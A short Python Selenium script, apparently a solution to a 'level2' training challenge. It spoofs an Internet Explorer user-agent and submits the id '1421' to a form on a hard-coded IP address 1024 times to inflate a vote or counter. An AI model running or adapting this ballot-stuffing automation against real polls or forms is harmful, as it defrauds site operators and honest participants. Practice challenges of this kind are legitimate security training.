#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent


options = Options()
ua = UserAgent()
options.add_argument(f'user-agent={ua.ie}')
driver = webdriver.Chrome(chrome_options=options, executable_path="/usr/local/bin/chromedriver")
driver.get('http://158.69.76.135/level2.php')
for i in range(1024):
    input_v = driver.find_element_by_name("id")
    input_v.send_keys("1421")
    input_v.send_keys(Keys.RETURN)
driver.quit()
